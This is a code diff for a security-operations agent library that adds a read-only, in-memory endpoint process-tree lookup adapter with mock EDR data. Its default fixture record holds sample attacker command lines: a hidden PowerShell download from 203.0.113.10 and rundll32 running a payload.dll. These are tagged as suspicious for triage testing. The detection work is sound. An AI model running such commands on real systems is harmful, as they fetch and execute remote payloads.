@@ -12,6 +12,7 @@ from soc_agent.contracts import (
     SocAgentActionResult,
     SocAgentRiskLevel,
     SocAssetLookupRecord,
+    SocEndpointProcessTreeRecord,
 )
 from soc_agent.protocols import SocActionAdapter
 
@@ -201,6 +202,7 @@ class DryRunOnlySocActionAdapter:
 
 
 ASSET_LOOKUP_ACTION = "asset.lookup"
+ENDPOINT_PROCESS_TREE_LOOKUP_ACTION = "endpoint.process_tree.lookup"
 
 
 def asset_lookup_adapter_descriptor(
@@ -310,6 +312,113 @@ class InMemoryAssetLookupActionAdapter:
         )
 
 
+def endpoint_process_tree_lookup_adapter_descriptor(
+    *,
+    adapter_id: str = "endpoint-process-tree-in-memory",
+) -> SocAgentActionAdapterDescriptor:
+    """Descriptor for a read-only endpoint process-tree lookup adapter."""
+
+    return SocAgentActionAdapterDescriptor(
+        adapter_id=adapter_id,
+        route=ENDPOINT_PROCESS_TREE_LOOKUP_ACTION,
+        action=ENDPOINT_PROCESS_TREE_LOOKUP_ACTION,
+        risk_level=SocAgentRiskLevel.READ_ONLY,
+        adapter_kind="service",
+        external_side_effect="read",
+        dry_run_supported=True,
+        execute_supported=True,
+        idempotency_required=False,
+        required_payload_fields=["host_key"],
+        description="Read-only endpoint process-tree lookup adapter.",
+    )
+
+
+class InMemoryEndpointProcessTreeLookupActionAdapter:
+    """Read-only endpoint process-tree lookup backed by in-memory records."""
+
+    def __init__(
+        self,
+        records: Iterable[SocEndpointProcessTreeRecord | Mapping[str, Any]] | None = None,
+        *,
+        descriptor: SocAgentActionAdapterDescriptor | None = None,
+    ) -> None:
+        self.descriptor = descriptor or endpoint_process_tree_lookup_adapter_descriptor()
+        if self.descriptor.action != ENDPOINT_PROCESS_TREE_LOOKUP_ACTION or self.descriptor.route != ENDPOINT_PROCESS_TREE_LOOKUP_ACTION:
+            raise SocActionAdapterRegistryError("InMemoryEndpointProcessTreeLookupActionAdapter requires route/action endpoint.process_tree.lookup")
+        if self.descriptor.risk_level is not SocAgentRiskLevel.READ_ONLY:
+            raise SocActionAdapterRegistryError("InMemoryEndpointProcessTreeLookupActionAdapter must be read-only")
+        if self.descriptor.external_side_effect != "read":
+            raise SocActionAdapterRegistryError("InMemoryEndpointProcessTreeLookupActionAdapter must declare external_side_effect=read")
+        self._records = _index_process_tree_records(records or _default_process_tree_records())
+
+    def dry_run(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if not command.dry_run:
+            raise SocActionAdapterRegistryError("endpoint.process_tree.lookup dry-run requires command.dry_run=true")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        host_key = _host_key_from_payload(command.payload)
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message="Endpoint process-tree lookup dry-run validated; no EDR read executed.",
+            payload={
+                "adapter_id": self.descriptor.adapter_id,
+                "adapter_kind": self.descriptor.adapter_kind,
+                "dry_run": True,
+                "host_key": host_key,
+                "process_tree_found": None,
+                "external_side_effect": "not_executed",
+                "read_only": True,
+                "executed_by": context.actor.model_dump(mode="json"),
+                "idempotency_key": context.idempotency_key,
+            },
+        )
+
+    def execute(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if command.dry_run:
+            raise SocActionAdapterRegistryError("endpoint.process_tree.lookup execute requires command.dry_run=false")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        host_key = _host_key_from_payload(command.payload)
+        record = self._records.get(_normalize_asset_key(host_key))
+        if record is None:
+            return SocAgentActionResult(
+                route=command.route,
+                action=command.action,
+                status="success",
+                message=f"Endpoint process-tree lookup completed; no process tree matched {host_key}.",
+                payload=_process_tree_lookup_payload(
+                    descriptor=self.descriptor,
+                    host_key=host_key,
+                    record=None,
+                    context=context,
+                ),
+            )
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message=f"Endpoint process-tree lookup completed for {host_key}.",
+            payload=_process_tree_lookup_payload(
+                descriptor=self.descriptor,
+                host_key=host_key,
+                record=record,
+                context=context,
+            ),
+        )
+
+
 def _adapter_key(route: str, action: str) -> tuple[str, str]:
     return (route.strip(), action.strip())
 
@@ -348,10 +457,27 @@ def _index_asset_records(records: Iterable[SocAssetLookupRecord | Mapping[str, A
     return index
 
 
+def _index_process_tree_records(records: Iterable[SocEndpointProcessTreeRecord | Mapping[str, Any]]) -> dict[str, SocEndpointProcessTreeRecord]:
+    index: dict[str, SocEndpointProcessTreeRecord] = {}
+    for item in records:
+        record = item if isinstance(item, SocEndpointProcessTreeRecord) else SocEndpointProcessTreeRecord.model_validate(item)
+        for key in (record.host_key, record.hostname, record.primary_ip):
+            if key:
+                index[_normalize_asset_key(key)] = record
+    return index
+
+
 def _asset_key_from_payload(payload: Mapping[str, Any]) -> str:
     value = payload.get("asset_key")
     if not isinstance(value, str) or not value.strip():
         raise SocActionAdapterRegistryError("asset.lookup requires non-empty payload asset_key")
+    return value.strip()
+
+
+def _host_key_from_payload(payload: Mapping[str, Any]) -> str:
+    value = payload.get("host_key")
+    if not isinstance(value, str) or not value.strip():
+        raise SocActionAdapterRegistryError("endpoint.process_tree.lookup requires non-empty payload host_key")
     return value.strip()
 
 
@@ -381,12 +507,77 @@ def _asset_lookup_payload(
     return payload
 
 
+def _process_tree_lookup_payload(
+    *,
+    descriptor: SocAgentActionAdapterDescriptor,
+    host_key: str,
+    record: SocEndpointProcessTreeRecord | None,
+    context: ServiceRequestContext,
+) -> dict[str, Any]:
+    return {
+        "adapter_id": descriptor.adapter_id,
+        "adapter_kind": descriptor.adapter_kind,
+        "dry_run": False,
+        "host_key": host_key,
+        "process_tree_found": record is not None,
+        "process_tree": record.model_dump(mode="json", exclude_none=True) if record is not None else None,
+        "external_side_effect": "read",
+        "read_only": True,
+        "mocked": record.mocked if record is not None else True,
+        "executed_by": context.actor.model_dump(mode="json"),
+        "idempotency_key": context.idempotency_key,
+    }
+
+
+def _default_process_tree_records() -> list[SocEndpointProcessTreeRecord]:
+    return [
+        SocEndpointProcessTreeRecord(
+            host_key="endpoint-1",
+            hostname="endpoint-1",
+            primary_ip="10.10.1.5",
+            process_tree_id="ptree-mock-001",
+            processes=[
+                {
+                    "pid": 4200,
+                    "parent_pid": 700,
+                    "process_name": "powershell.exe",
+                    "command_line": "powershell.exe -nop -w hidden Invoke-WebRequest http://203.0.113.10/a",
+                    "user": "UM001",
+                    "risk_tags": ["suspicious_powershell", "network_download"],
+                },
+                {
+                    "pid": 4488,
+                    "parent_pid": 4200,
+                    "process_name": "rundll32.exe",
+                    "command_line": "rundll32.exe C:\\Users\\Public\\payload.dll,Start",
+                    "user": "UM001",
+                    "risk_tags": ["payload_execution"],
+                },
+            ],
+            network_connections=[
+                {
+                    "process_name": "powershell.exe",
+                    "remote_ip": "203.0.113.10",
+                    "remote_port": 80,
+                    "direction": "outbound",
+                    "protocol": "tcp",
+                }
+            ],
+            source="mock_edr_process_tree",
+            mocked=True,
+        )
+    ]
+
+
 __all__ = [
     "ASSET_LOOKUP_ACTION",
+    "ENDPOINT_PROCESS_TREE_LOOKUP_ACTION",
     "DryRunOnlySocActionAdapter",
     "InMemoryAssetLookupActionAdapter",
+    "InMemoryEndpointProcessTreeLookupActionAdapter",
     "SocActionAdapterNotFoundError",
     "SocActionAdapterRegistry",
     "SocActionAdapterRegistryError",
     "asset_lookup_adapter_descriptor",
+    "endpoint_process_tree_lookup_adapter_descriptor",
 ]
